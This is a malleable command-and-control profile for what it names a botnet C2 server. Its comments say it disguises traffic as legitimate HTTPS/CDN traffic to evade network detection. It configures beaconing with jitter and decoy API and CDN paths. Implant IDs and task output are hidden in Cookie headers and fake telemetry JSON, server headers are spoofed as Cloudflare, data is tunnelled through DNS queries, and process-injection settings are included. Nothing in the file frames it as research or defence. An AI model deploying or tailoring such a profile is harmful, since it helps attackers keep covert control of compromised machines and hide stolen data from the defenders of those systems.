# FORGE OPSEC — Malleable C2 Profile
# Shapes C2 traffic to resemble legitimate HTTPS/CDN traffic.
# Deploy alongside C2 server to evade network detection.

[global]
    tool_name       = "botnet_c2_server_with_aes_encrypted_comm"
    user_agent      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    jitter          = 15%
    beacon_interval = 60s
    dns_idle        = 8.8.8.8

[http-get]
    uri             = "/api/v1/status /cdn/assets/main.js /static/health"
    verb            = GET

    [client]
        header "Accept" "application/json, text/html, */*"
        header "Accept-Language" "en-US,en;q=0.9"
        header "Accept-Encoding" "gzip, deflate, br"
        header "Connection" "keep-alive"
        header "Cache-Control" "max-age=0"
        # Data encoded in Cookie header
        metadata {
            base64url
            prepend "session="
            header "Cookie"
        }

    [server]
        header "Content-Type" "application/json; charset=utf-8"
        header "Server" "cloudflare"
        header "X-Content-Type-Options" "nosniff"
        header "X-Frame-Options" "DENY"
        # Response wrapped in JSON
        output {
            base64url
            prepend "{\"status\":\"ok\",\"data\":\""
            append "\"}"
            print
        }

[http-post]
    uri             = "/api/v1/telemetry /cdn/upload /analytics/event"
    verb            = POST

    [client]
        header "Content-Type" "application/json"
        header "Accept" "application/json"
        # Task output in POST body
        output {
            base64url
            prepend "{\"event_type\":\"pageview\",\"payload\":\""
            append "\"}"
            print
        }
        # Implant ID in Cookie
        id {
            base64url
            prepend "session="
            header "Cookie"
        }

    [server]
        header "Content-Type" "application/json"
        output {
            print
        }

[dns-beacon]
    dns_idle        = 8.8.8.8
    dns_sleep       = 120
    maxdns          = 200

    [client]
        # Encode data in DNS queries
        prepend "api."
        append ".cdn.cloudflare.com"

[process-inject]
    min_alloc       = 16384
    startrwx        = false
    userwx          = false
